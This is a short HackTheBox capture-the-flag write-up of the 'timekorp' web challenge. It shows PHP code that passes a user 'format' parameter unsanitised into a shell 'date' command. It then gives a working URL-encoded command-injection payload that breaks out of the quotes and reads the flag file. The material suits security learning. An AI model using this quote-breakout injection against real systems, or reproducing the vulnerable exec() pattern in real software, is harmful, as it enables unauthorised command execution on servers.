# Day02 - timekorp

- **Platform**: HackTheBox  
- **Category**: Web  
- **Difficulty**: Easy  
- **Date**: 2025-05-02  
- **Tools Used**: Browser, Grep, PHP source analysis  

---

## Summary
A time display app accepted a `format` parameter that was passed directly into a system call without sanitization. By breaking out of the string in the `date` command, I was able to achieve command injection and read the flag.

---

## Enumeration
- Accessed the app at `http://94.237.51.163:49486/`.  
- Found `?format=` parameter modified the displayed time.  
- Reviewed provided source code (`index.php`, `router.php`, `TimeController.php`, `TimeModel.php`, `Dockerfile`).  
- Vulnerable code in `TimeModel.php`:
  ```php
  $this->command = "date '+" . $format . "' 2>&1";
  $time = exec($this->command);
  ```
- Input from `format` was injected directly into a shell command.

---

## Exploitation
- First tried:
  ```
  ?format=%25H%25M%25S;cat%20/flag
  ```
  This failed because everything stayed inside single quotes.  

- Working payload:
  ```
  ?format=%25H%25M%25S%27;%20cat%20/flag%20%23
  ```
  Which decodes to:
  ```
  date '+%H%M%S'; cat /flag #'
  ```

- This successfully broke out of the command, ran `cat /flag`, and returned the flag.

---

## Lessons Learned
- Even harmless-looking parameters (like date formats) can lead to command injection.  
- PHP `exec()` returns only the last line of output, which can make debugging payloads confusing.  
- Breaking out of quoted strings is a core exploitation technique.  
- Reviewing source code often reveals vulnerabilities much faster than blind testing.  
